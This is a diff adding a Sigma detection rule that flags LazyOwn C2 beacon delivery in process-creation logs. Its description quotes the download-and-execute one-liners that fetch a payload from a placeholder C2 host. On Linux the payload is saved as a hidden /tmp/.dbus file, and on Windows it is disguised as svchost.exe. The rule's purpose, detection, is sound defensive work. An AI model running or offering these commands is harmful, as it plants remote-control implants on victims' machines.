@@ -1,0 +1,39 @@
+title: LazyOwn Beacon Quick-Start Download One-Liner
+id: f310f6a9-32a6-5a4e-83a0-fc21333b4d7c
+status: experimental
+description: |
+    Detects the beacon delivery commands the LazyOwn c2_quickstart command prints for the operator to run on a target:
+    curl -sk 'https://<c2>:<port><route>lin' -o /tmp/.dbus && chmod +x /tmp/.dbus && /tmp/.dbus on Linux, and
+    iwr -Uri 'https://<c2>:<port><route>win.exe' -OutFile $env:TEMP\svchost.exe; Start-Process $env:TEMP\svchost.exe on
+    Windows. The operator can change both.
+references:
+    - https://github.com/grisuno/LazyOwn
+    - https://github.com/ThreatDefence/agentic-attack-detections
+author: ThreatDefence
+date: 2026-11-26
+tags:
+    - attack.command-and-control
+    - attack.t1105
+    - attack.execution
+    - attack.t1059.004
+    - attack.t1059.001
+logsource:
+    category: process_creation
+detection:
+    selection_linux:
+        CommandLine|contains|all:
+            - 'curl -sk'
+            - '-o /tmp/.dbus'
+    selection_linux_run:
+        CommandLine|contains|all:
+            - 'chmod +x /tmp/.dbus'
+            - '/tmp/.dbus'
+    selection_windows:
+        CommandLine|contains|all:
+            - 'iwr -Uri'
+            - 'win.exe'
+            - '\svchost.exe'
+    condition: 1 of selection_*
+falsepositives:
+    - Authorized tests with LazyOwn
+level: high
